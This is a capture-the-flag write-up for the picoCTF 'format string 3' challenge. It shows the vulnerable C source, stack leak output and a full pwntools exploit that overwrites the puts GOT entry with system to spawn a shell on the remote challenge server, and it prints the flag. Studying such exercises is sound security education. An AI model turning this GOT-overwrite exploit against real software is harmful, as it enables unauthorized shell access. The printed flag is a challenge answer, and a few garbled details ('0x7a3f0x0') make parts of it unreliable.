# format string 3

This program doesn't contain a win function. How can you win? Download the binary [here](https://artifacts.picoctf.net/c_rhea/3/format-string-3). Download the source [here](https://artifacts.picoctf.net/c_rhea/3/format-string-3.c). Download libc [here](https://artifacts.picoctf.net/c_rhea/3/libc.so.6), download the interpreter [here](https://artifacts.picoctf.net/c_rhea/3/ld-linux-x86-64.so.2). Run the binary with these two files present in the same directory.

As we are given the binary and the interpreter, we must mark both of them as executable to run:

```console
$ chmod u+x format-string-3 ld-linux-x86-64.so.2
```

Looking at the sourcecode, we see a string variable `normal_string` is set to `/bin/sh`.

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}

```

This string is passed to a call to `puts()` at the end of `main()`. If this is changed to a call to `system()`, we can spawn a shell. This can be achieved by overwriting entries in the Global Offset Table (GOT which is a table within the binary that stores the memory addresses of different library calls.

To overwrite the GOT entry, we need to find the offset of our input string on the stack. As we are given the offset of `setvbuf` in `hello()`, we can calculate the base address of libc.

We can use 8 'A' to leak to cause an overflow and then `%p` to view addresses on the stack:

```
AAAAAAAA|0x7f47813e8963|0xfbad208b|0x7ffef7a26b30|0x1|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x4141414141414141|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|
/bin/sh
```

The `0x4141..41` is at offset 38.

Now, looking at the provided libc, since we have the address of `setvbuf`, we only need to calculate the base address of libc. For this, the offset of `setvbuf` is needed which can be found via `objdump`:

```
$ objdump -T libc.so.6 | grep "setvbuf"    
000000000007a3f0 g    DF .text  0000000000000260  GLIBC_2.2.5 _IO_setvbuf
000000000007a3f0  w   DF .text  0000000000000260  GLIBC_2.2.5 setvbuf
```

With this address (`000000000007a3f0x0`), we can calculate the base of libc as follows:

```
libc_base_address = [leaked setvbuf] - 000000000007a3f0x0
```

We can solve this as follows:

```python
from pwn import *

elf = context.binary = ELF('./format-string-3')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info("offset = %d", offset)

# p = elf.process()
p = remote('rhea.picoctf.net', 49745)

p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)

libc = ELF("./libc.so.6")
libc.address = setvbuf_leak - libc.symbols['setvbuf']  # normalizing libc base address

sys_addr = libc.symbols['system']
puts_addr = elf.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()
```

```
picoCTF{G07_G07?_f574d38f}
```

-----

The challenge covers a **format string vulnerability**. This is a type of vulnerability where submitted data of an input string is evaluated as an argument to an unsafe use of e.g., a `printf()` function by the application, resulting in the ability to read and/or write to memory.